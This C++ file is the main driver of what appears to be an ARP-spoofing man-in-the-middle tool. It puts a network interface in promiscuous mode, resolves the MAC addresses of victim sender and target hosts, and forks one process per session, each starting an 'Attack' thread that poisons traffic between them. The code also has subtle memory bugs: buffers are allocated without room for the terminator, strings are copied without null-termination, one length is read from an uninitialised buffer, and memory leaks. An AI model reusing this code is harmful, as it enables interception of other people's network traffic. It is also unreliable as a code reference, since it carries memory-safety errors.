#include "stdafx.h"
using namespace std;

pthread_t thread[PTHREAD_NUM];
int num_of_parameter = 0;
pid_t pid[SESSION_NUM];
pcap_t* handle;

void terminate_Process(int sig){
	pthread_join(thread[3], NULL);
	for(int i = 0; i < num_of_parameter; i++){
		kill(pid[i], SIGKILL);
	}
	pcap_close(handle);
}

char* make_Parameter_REQ(char* at_ip_addr, char* at_mac_addr, char* ip, pcap_t* handles){
	struct Parameter_Pthread pt2;
	char* temp_mac = (char*)malloc(sizeof(char) * 40);
	if(temp_mac == NULL){ perror("mac malloc error"); exit(1); }

	pt2.sip = (char*)malloc(strlen(at_ip_addr));
	if(pt2.sip == NULL){ perror("pt2.sip malloc error"); exit(1); }
	pt2.smac = (char*)malloc(strlen(at_mac_addr));
	if(pt2.smac == NULL){ perror("pt2.smac malloc error"); exit(1); }

	pt2.tip = (char*)malloc(strlen(ip));
	if(pt2.tip == NULL){ perror("pt2.tip malloc error"); exit(1); }
	pt2.tmac = (char*)malloc(strlen(temp_mac));
	if(pt2.tmac == NULL){ perror("pt2.tmac malloc error"); exit(1); }

	strncpy(pt2.sip, at_ip_addr, strlen(at_ip_addr));
	strncpy(pt2.smac, at_mac_addr, strlen(at_mac_addr));
	strncpy(pt2.tip, ip, strlen(ip));
	strncpy(pt2.tmac, temp_mac, strlen(temp_mac));
	pt2.handle = handles;
	pthread_create(&thread[1], NULL, find_Mac, (void*)&pt2);
	pthread_join(thread[1], (void**)(&temp_mac));
	return temp_mac;
}


// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// argv[1] : interface
// argv[2] : sender ip1 / argv[3] : target ip1
// argv[2] : sender ip2 / argv[3] : target ip2
// ...
int main(int argc, char* argv[]) {
	if(argc < 3){
		usage();
		perror("Wrong Parameter!");
		exit(0);
	}

// ########## Set sigaction fuction for SIGINT(ctrl + c) ##########
	struct sigaction sa;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	sa.sa_handler = terminate_Process;
	if(sigaction(SIGINT, &sa, NULL) == -1){
		perror("sigaction error");
		exit(0);
	}

// ########## Make a pcap environment ##########
	char errbuf[PCAP_ERRBUF_SIZE];
	// P Mode
	handle = pcap_open_live(DEFAULT_DEVICE, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", DEFAULT_DEVICE, errbuf);
		return -1;
	}
// ########################################

// ########## Make a socket to find my IP & MAC address ##########
	char* a_mac_addr = (char*)malloc(128);
	if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
	char* s_ip_addr = (char*)malloc(128);
	if(s_ip_addr == NULL){ perror("s_ip_addr malloc error"); exit(1); }
	pthread_create(&thread[0], NULL, find_My_Mac, (void*)(a_mac_addr));
	pthread_join(thread[0], (void**)(&s_ip_addr));
	printf("[ Success to find my mac address : %s ]\n", a_mac_addr);
// ########################################

// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@ Management of Sessions @@@@@@@@@
// Session(char* sender_mac, char* sender_ip, char* target_mac, char* target_ip)
	num_of_parameter = (argc-1)/2;
	if(num_of_parameter > 20){
		perror("Overflow of Session!");
		exit(0);
	}

	Session s[SESSION_NUM];
	int cnt = 2;
	for(int i = 0; i < num_of_parameter; i++){
		pid[i] = fork();
		if(pid[i] != 0){
			// Find mac using pcap_sendpacket
			char* smac = (char*)malloc(sizeof(char) * 40);
			if(smac == NULL){ perror("mac malloc error"); exit(1); }
			smac = make_Parameter_REQ(s_ip_addr, a_mac_addr, argv[cnt], handle);
			printf("[ Success to find < %s > mac address : %s ]\n", argv[cnt], smac);
			char* dmac = (char*)malloc(sizeof(char) * 40);
			if(dmac == NULL){ perror("mac malloc error"); exit(1); }
			dmac = make_Parameter_REQ(s_ip_addr, a_mac_addr, argv[cnt+1], handle);
			printf("[ Success to find < %s > mac address : %s ]\n", argv[cnt+1], dmac);

			// ########## Make contents of Attack parameters ##########
			struct Parameter_Pthread pt;
			pt.sip = (char*)malloc(strlen(argv[cnt]));
			if(pt.sip == NULL){ perror("pt.sip malloc error"); exit(1); }
			pt.smac = (char*)malloc(strlen(a_mac_addr));
			if(pt.smac == NULL){ perror("pt.smac malloc error"); exit(1); }

			pt.tip = (char*)malloc(strlen(argv[cnt+1]));
			if(pt.tip == NULL){ perror("pt.tip malloc error"); exit(1); }
			pt.tmac = (char*)malloc(strlen(smac));
			if(pt.tmac == NULL){ perror("pt.tmac malloc error"); exit(1); }

			strncpy(pt.sip, argv[cnt+1], strlen(argv[cnt+1]));
			strncpy(pt.smac, a_mac_addr, strlen(a_mac_addr));
			strncpy(pt.tip, argv[cnt], strlen(argv[cnt]));
			strncpy(pt.tmac, smac, strlen(smac));
			pt.handle = handle;
			// ########################################

			// ########## Attack ##########
			pthread_create(&thread[3], NULL, Attack, (void*)&pt);
			// ########################################

			s[i].set(i+1, smac, argv[cnt], dmac, argv[cnt+1], handle, a_mac_addr);
			s[i].handle_session();
			cnt += 2;
		}
	}
// @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
}





